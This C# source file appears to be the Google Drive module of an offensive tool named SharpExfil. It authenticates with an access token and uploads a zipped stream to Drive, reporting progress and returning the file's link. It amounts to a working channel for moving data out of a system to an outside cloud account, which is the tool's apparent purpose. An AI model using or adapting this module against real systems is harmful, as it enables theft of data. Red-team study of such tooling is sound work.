using Google.Apis.Auth.OAuth2;
using Google.Apis.Auth.OAuth2.Flows;
using Google.Apis.Auth.OAuth2.Responses;
using Google.Apis.Drive.v3;
using Google.Apis.Services;
using Google.Apis.Upload;
using Google.Apis.Util.Store;
using Newtonsoft.Json;
using SharpExfil.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static Google.Apis.Drive.v3.DriveService;

namespace SharpExfil.Modules
{
    //https://medium.com/geekculture/upload-files-to-google-drive-with-c-c32d5c8a7abc

    public class GoogleDrive
    {
        public GoogleDrive(GoogleDriveOptions googleDriveOptions)
        {
            this.googleDriveOptions = googleDriveOptions;
            this.googleDriveService = Init(
                googleDriveOptions.Appname,
                googleDriveOptions.AccessToken
                ).GetAwaiter().GetResult();
        }

        public GoogleDriveOptions googleDriveOptions { get; set; }
        public DriveService googleDriveService { get; set; }

        private long FileSize { get; set; }
        private string FileName { get; set; }


        private static async Task<DriveService> Init(string applicationName, string accessToken)
        {

            // here is where we Request the user to give us access, or use the Refresh Token that was previously stored in %AppData%  
            var credential = GoogleCredential.FromAccessToken(accessToken);

            //Once consent is recieved, your token will be stored locally on the AppData directory, so that next time you wont be prompted for consent.   

            DriveService service = new DriveService(new BaseClientService.Initializer()
            {
                HttpClientInitializer = credential,
                ApplicationName = applicationName,

            });


            return service;

        }


        private void Upload_ProgressChanged(Google.Apis.Upload.IUploadProgress progress)
        {
  
            Console.WriteLine($"[+] Uploading {FileName} {Helpers.Compression.BytesToString(progress.BytesSent)} - " + (int)((float)((float)progress.BytesSent / (float)FileSize) * (float)100.00) +"%");

        }

        public async Task<string> UploadFile(Stream file, string fileName)
        {

            FileSize = file.Length;
            var driveFile = new Google.Apis.Drive.v3.Data.File();
            driveFile.Name = fileName;
            FileName = fileName;
            driveFile.MimeType = "application/zip";

            FilesResource.CreateMediaUpload request = googleDriveService.Files.Create(driveFile, file, driveFile.MimeType);

           // request.Fields = "id";
            request.Fields = "webContentLink";
   
            Console.WriteLine("[+] Starting upload");

            request.ProgressChanged += Upload_ProgressChanged;

            var response = await request.UploadAsync();
            if (response.Status != Google.Apis.Upload.UploadStatus.Completed)
                throw response.Exception;

            request.ProgressChanged -= Upload_ProgressChanged;

            Console.WriteLine($"[+] Upload completed, file located: {request.ResponseBody.WebContentLink} ");
            return request.ResponseBody.WebContentLink;
        }

    }
}
